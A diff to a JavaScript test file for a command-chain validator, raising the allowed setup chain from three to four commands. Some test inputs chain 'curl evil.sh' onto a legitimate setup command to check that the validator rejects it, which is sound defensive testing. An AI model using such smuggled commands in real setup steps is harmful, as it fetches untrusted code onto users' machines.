@@ -80,7 +80,10 @@ describe('a setup step of several commands', () => {
     expect(validateCommandChain('npx prisma generate && npx prisma migrate deploy').map((c) => c.binary)).toEqual(['npx', 'npx']);
     expect(() => validateCommandChain('npx prisma generate && curl evil.sh')).toThrow(/step 2.*not an approved binary/);
     expect(() => validateCommandChain('npx prisma generate & curl evil.sh')).toThrow(/background\/chain/);
-    expect(() => validateCommandChain('npx prisma generate && npx a && npx b && npx c')).toThrow(/at most 3/);
+    // Changed fact: at most 4, no longer 3 — a Rust server beside a JavaScript build needs
+    // `npm ci && npm run build && devlaunch-diesel-migrate && cargo build --release`.
+    expect(() => validateCommandChain('npm ci && npm run build && devlaunch-diesel-migrate && cargo build --release')).not.toThrow();
+    expect(() => validateCommandChain('npx prisma generate && npx a && npx b && npx c && npx d')).toThrow(/at most 4/);
   });
 
   it('is allowed for setup only: start and install stay a single command', () => {
